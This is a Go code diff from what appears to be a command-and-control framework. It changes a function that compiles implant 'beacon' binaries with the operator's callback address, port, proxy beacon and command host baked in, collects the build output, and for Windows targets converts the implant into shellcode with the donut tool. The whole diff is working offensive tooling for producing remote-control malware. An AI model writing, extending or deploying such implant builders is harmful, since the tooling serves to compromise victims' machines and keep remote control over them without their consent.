@@ -52,6 +52,8 @@ func createBeacon(listener int) {
 	beaconId := genRandID()
 	beaconName := beaconId//"beacon" + ip + "." + port	
 	buildFlags := ""
+	var cmdHandle *exec.Cmd
+	var output string
 
 	if target == "windows" {
 		beaconName += ".exe"
@@ -87,17 +89,53 @@ func createBeacon(listener int) {
 		notifyBeaconOfProxyUpdate(beacon, beaconId)
 
 		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
-		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
+		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go")
 	} else {
 		fmt.Println("No proxy")
-		exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName).Output()
+		cmdHandle = exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName)
+	}
+
+	stderr, err := cmdHandle.StderrPipe()
+	stdout, err := cmdHandle.StdoutPipe()
+	
+	if err = cmdHandle.Start(); err == nil {
+		scanner := bufio.NewScanner(stderr)
+		
+		if err != nil {
+			output += scanner.Text()
+			output += "\n"
+		}
+
+		for scanner.Scan() {
+			output += scanner.Text()
+			output += "\n"
+		}
+
+		scanner = bufio.NewScanner(stdout)
+		
+		if err != nil {
+			output += scanner.Text()
+			output += "\n"
+		}
+
+		for scanner.Scan() {
+			output += scanner.Text()
+			output += "\n"
+		}
+	}
+
+	if len(output) > 0 {
+		fmt.Println(output)
 	}
 
 	//beacon := &Beacon{"n/a", beaconId, nil, nil, nil, nil, time.Time{}}
 	// beacons = append(beacons, beacon)
 	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
-	out, err := exec.Command("/bin/sh", "-c", "./utils/donut out/" + beaconName + " -o out/" + beaconName + ".bin").Output()
-	fmt.Println(string(out))
+	
+	if target == "windows" {
+		out, _ := exec.Command("/bin/sh", "-c", "./utils/donut out/" + beaconName + " -o out/" + beaconName + ".bin").Output()
+		fmt.Println(string(out))
+	}
 }
 
 func listTargets() {
